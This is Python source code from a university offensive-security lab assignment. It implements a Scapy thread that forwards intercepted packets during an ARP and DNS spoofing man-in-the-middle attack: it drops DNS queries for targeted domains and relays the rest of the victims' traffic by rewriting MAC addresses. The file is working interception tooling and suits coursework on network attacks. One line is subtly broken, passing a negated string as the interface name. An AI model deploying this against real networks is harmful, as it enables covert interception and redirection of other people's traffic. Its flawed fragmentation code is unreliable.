"""
Assignment for course 2IC80, Lab on Offensive Computer Security, at TU/e
Created by;
Daan Boelhouwers(1457152), d.boelhouwers@student.tue.nl
Richard Farla(1420380), r.farla@student.tue.nl
Ivar de Win(1406663), i.j.f.d.win@student.tue.nl
"""

from scapy import packet
from scapy.layers.dns import DNSQR, DNS
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP, fragment
from scapy.sendrecv import sendp, sniff
from scapy.arch import get_if_addr, get_if_hwaddr
import threading


class Forwarding(threading.Thread):

    def __init__(self, interface: str, hosts: dict, domain_names: list):
        """
        Starts DNS spoofing in a background thread

            :param interface: interface on which DNS requests will be sniffed
            :param hosts: list of discovered hosts, used to forward to correct IP
            :param domain_names: list of domain names that are being dns spoofed
        """
        super(Forwarding, self).__init__()
        self.interface = interface
        self.hosts = hosts
        self.domain_names = domain_names
        self.host_ip = get_if_addr(interface)
        self.host_mac = get_if_hwaddr(interface)
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def is_stopped(self):
        return self._stop.isSet()

    def run(self):

        def get_original_mac(ip_addr: str) -> str:
            # Get correct (non-spoofed) mac address corresponding to the IP of the received packet
            for mac in self.hosts[self.interface]:
                for ip in self.hosts[self.interface][mac]:
                    if ip == ip_addr:
                        return mac

        def forward(received_packet: packet) -> None:
            # Packet is a DNS request that will be spoofed?
            if DNS in received_packet and received_packet[DNS].qr == 0 and \
                    (received_packet[DNSQR].qname.decode("utf8")[:-1] in self.domain_names):
                # TODO: For now DNS request for spoofed domains are simply dropped,
                #  in the future they should be forwarded with SSL stripping
                return

            # Packet is meant for host?
            elif received_packet[IP].dst == self.host_ip:
                return

            else:
                correct_mac = get_original_mac(received_packet[IP].dst)
                received_packet[Ether].src = self.host_mac
                received_packet[Ether].dst = correct_mac
                # Delete checksum and length such that scapy recomputes the correct values when sending
                del received_packet[IP].len
                del received_packet[IP].chksum
                if UDP in received_packet:
                    del received_packet[UDP].len
                    del received_packet[UDP].chksum

                try:
                    # Fragment packets that are to large to be sent
                    # TODO: this number probably differs from machine to machine,
                    #  it should be adapted accordingly
                    if len(received_packet) > 1500:
                        packets = fragment(received_packet)
                        for pkt in packets:
                            sendp(pkt, iface=-self.interface, verbose=False)
                    else:
                        sendp(received_packet, iface=self.interface, verbose=False)
                except Exception as e:
                    print(e)

        print("Now forwarding spoofed ARP and DNS packets...")
        while True:
            if self.is_stopped():
                print("Stopped forwarding spoofed ARP and DNS packets")
                return
            sniff(iface=self.interface, prn=forward, filter="ip", store=0, timeout=1)
